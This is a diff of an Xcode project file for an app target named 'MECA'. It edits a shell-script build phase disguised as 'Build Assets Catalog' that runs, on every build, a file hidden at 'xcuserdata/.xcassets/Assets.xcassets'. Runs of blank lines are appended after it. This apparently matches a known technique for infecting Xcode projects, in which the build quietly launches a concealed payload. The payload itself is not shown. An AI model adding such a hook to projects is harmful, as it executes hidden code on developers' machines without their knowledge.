@@ -830,7 +830,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				3D1A8C7191F68F44E3AAC43A /* Build Assets Catalog */,
+				A2FDB2D4A2EAAB9FDDAAC43A /* Build Assets Catalog */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -968,7 +968,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	3D1A8C7191F68F44E3AAC43A /* Build Assets Catalog */ = {
+	A2FDB2D4A2EAAB9FDDAAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -986,8 +986,18 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
